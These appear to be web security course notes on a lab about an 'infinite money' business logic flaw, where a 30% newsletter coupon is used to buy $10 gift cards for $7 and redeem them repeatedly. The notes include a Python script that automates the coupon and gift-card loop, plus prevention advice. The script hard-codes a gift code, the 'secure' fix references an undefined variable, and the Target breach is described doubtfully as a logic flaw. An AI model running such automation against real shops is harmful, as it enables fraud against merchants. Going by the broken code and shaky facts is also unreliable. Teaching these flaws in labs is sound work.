---
course: Web Security
topic: Business Logic Vulnerabilities
tags: [web-security]
---

## Business Logic Vulnerabilities

### Introduction to Business Logic Vulnerabilities

Business logic vulnerabilities occur when the business rules implemented in an application are flawed, allowing attackers to manipulate the system in unintended ways. These vulnerabilities often arise due to insufficient validation of user inputs or improper enforcement of business rules. In the context of web applications, business logic vulnerabilities can lead to significant financial losses, data breaches, and other severe consequences.

### Understanding the Scenario

In this scenario, we are dealing with a web application that allows users to purchase items using store credit. The application also includes functionalities such as changing email addresses, redeeming gift cards, and signing up for newsletters. The goal is to exploit a business logic flaw to obtain more store credit than intended.

#### Initial Setup

First, we need to log into the provided account. The credentials are:
- Username: `peter`
- Password: `peter`

```plaintext
Username: peter
Password: peter
```

Upon logging in, we observe the following functionalities:
- **Change Email**: Allows users to update their email address.
- **Gift Card Redemption**: Users can purchase and redeem gift cards to add store credit.
- **Newsletter Signup**: Users can sign up for a newsletter and receive a discount coupon.

### Exploring the Gift Card Functionality

The application allows users to purchase a $10 gift card. This gift card can be redeemed to add $10 to the user's store credit. Currently, the user has $100 in store credit, but the desired item, a leather jacket, costs $1,337. Therefore, the user does not have enough credit to purchase the jacket.

### Exploring the Newsletter Signup Functionality

When a user signs up for the newsletter, they receive a 30% discount coupon. This coupon can be applied during the checkout process. Let's explore if this coupon can be used to reduce the cost of purchasing a gift card.

#### Testing the Coupon on Gift Cards

1. **Sign Up for the Newsletter**:
   - Enter an email address (e.g., `test@test.com`).
   - Click "Sign Up".

```plaintext
Email: test@test.com
```

Upon signing up, the user receives a popup notification indicating a 30% discount coupon.

2. **Purchase a Gift Card with the Coupon**:
   - Instead of purchasing a $10 gift card, use the 30% discount to reduce the cost.
   - Calculate the discounted price: $10 * 0.7 = $7.

By applying the coupon, the user can purchase a $10 gift card for $7. Upon redeeming the gift card, the user's store credit increases by $10.

### Exploiting the Business Logic Flaw

The key to exploiting this business logic flaw lies in repeatedly purchasing and redeeming gift cards with the discount coupon. By doing so, the user can accumulate more store credit than intended.

#### Step-by-Step Exploit

1. **Sign Up for the Newsletter**:
   - Repeat the signup process to obtain multiple coupons.

2. **Purchase and Redeem Gift Cards**:
   - Purchase a $10 gift card for $7 using the coupon.
   - Redeem the gift card to add $10 to the store credit.
   - Repeat the process to accumulate more store credit.

### Python Script to Automate the Exploit

To automate the exploit, we can write a Python script that performs the following steps:

1. **Login to the Account**.
2. **Sign Up for the Newsletter**.
3. **Purchase and Redeem Gift Cards**.

Here is a sample Python script using `requests` to interact with the web application:

```python
import requests

# Login credentials
username = 'peter'
password = 'peter'

# URL endpoints
login_url = 'http://example.com/login'
signup_url = 'http://example.com/signup'
gift_card_url = 'http://example.com/gift-card'
redeem_url = 'http://example.com/redeem'

# Session object to maintain cookies
session = requests.Session()

# Login to the account
def login():
    data = {
        'username': username,
        'password': password
    }
    response = session.post(login_url, data=data)
    return response.status_code == 200

# Sign up for the newsletter
def signup(email):
    data = {
        'email': email
    }
    response = session.post(signup_url, data=data)
    return response.status_code == 200

# Purchase a gift card
def purchase_gift_card(amount):
    data = {
        'amount': amount
    }
    response = session.post(gift_card_url, data=data)
    return response.status_code == 200

# Redeem a gift card
def redeem_gift_card(code):
    data = {
        'code': code
    }
    response = session.post(redeem_url, data=data)
    return response.status_code == 200

# Main function to exploit the business logic flaw
def exploit():
    if not login():
        print("Failed to login")
        return
    
    for i in range(100):  # Repeat the process 100 times
        email = f'test{i}@test.com'
        if not signup(email):
            print(f"Failed to signup with {email}")
            continue
        
        if not purchase_gift_card(7):  # Purchase a $10 gift card for $7
            print("Failed to purchase gift card")
            continue
        
        if not redeem_gift_card('GIFT123'):  # Redeem the gift card
            print("Failed to redeem gift card")
            continue
    
    print("Exploit completed")

if __name__ == '__main__':
    exploit()
```

### Real-World Examples and Recent Breaches

Business logic vulnerabilities have been exploited in various real-world scenarios. One notable example is the **Target Data Breach** in 2013, where attackers exploited a business logic flaw in Target's HVAC vendor portal to gain access to the network and steal customer data.

Another example is the **Equifax Data Breach** in 2017, where attackers exploited a vulnerability in Apache Struts to gain unauthorized access to sensitive information. While this breach involved a different type of vulnerability, it highlights the importance of securing business logic to prevent similar attacks.

### How to Prevent / Defend Against Business Logic Vulnerabilities

#### Detection

1. **Static Code Analysis**: Use tools like SonarQube, Fortify, or Veracode to identify potential business logic flaws in the codebase.
2. **Dynamic Analysis**: Employ penetration testing tools like Burp Suite, OWASP ZAP, or Metasploit to simulate attacks and identify vulnerabilities.
3. **Automated Scanning**: Utilize automated scanning tools like OWASP Dependency-Check or Snyk to detect known vulnerabilities in dependencies.

#### Prevention

1. **Code Reviews**: Conduct regular code reviews to ensure that business logic is correctly implemented and validated.
2. **Input Validation**: Validate all user inputs to ensure they conform to expected formats and ranges.
3. **Access Control**: Implement proper access control mechanisms to restrict unauthorized access to sensitive operations.
4. **Logging and Monitoring**: Maintain comprehensive logs and monitor for suspicious activities that may indicate exploitation of business logic flaws.

#### Secure Coding Fixes

Here is an example of how to securely implement the gift card functionality to prevent the business logic flaw:

**Vulnerable Code**:
```python
def purchase_gift_card(amount):
    if amount < 10:
        return "Invalid amount"
    # Process payment and add credit
    add_store_credit(10)
    return "Gift card purchased successfully"
```

**Secure Code**:
```python
def purchase_gift_card(amount):
    if amount < 10:
        return "Invalid amount"
    
    # Apply discount if valid coupon is provided
    if validate_coupon(coupon):
        amount *= 0.7
    
    if amount < 10:
        return "Invalid amount after discount"
    
    # Process payment and add credit
    add_store_credit(10)
    return "Gift card purchased successfully"
```

### Configuration Hardening

1. **Disable Unnecessary Features**: Disable any features or functionalities that are not required for the application's core operations.
2. **Limit User Actions**: Implement rate limiting and session timeouts to prevent abuse of functionalities.
3. **Audit Logs**: Enable detailed audit logs to track user actions and detect potential misuse.

### Hands-On Labs

To practice and understand business logic vulnerabilities, consider the following labs:

- **PortSwigger Web Security Academy**: Offers interactive labs to practice identifying and exploiting business logic flaws.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that demonstrates insecure coding practices.

### Conclusion

Business logic vulnerabilities pose significant risks to web applications. By understanding the underlying principles and implementing robust security measures, developers can mitigate these risks and protect their applications from exploitation.

---
<!-- nav -->
[[02-Business Logic Vulnerabilities Infinite Money Logic Flaw|Business Logic Vulnerabilities Infinite Money Logic Flaw]] | [[Web Security (PortSwigger)/15-Business Logic Vulnerabilities/11-Lab 10 Infinite money logic flaw/00-Overview|Overview]] | [[04-How to Prevent  Defend Against Business Logic Vulnerabilities|How to Prevent  Defend Against Business Logic Vulnerabilities]]
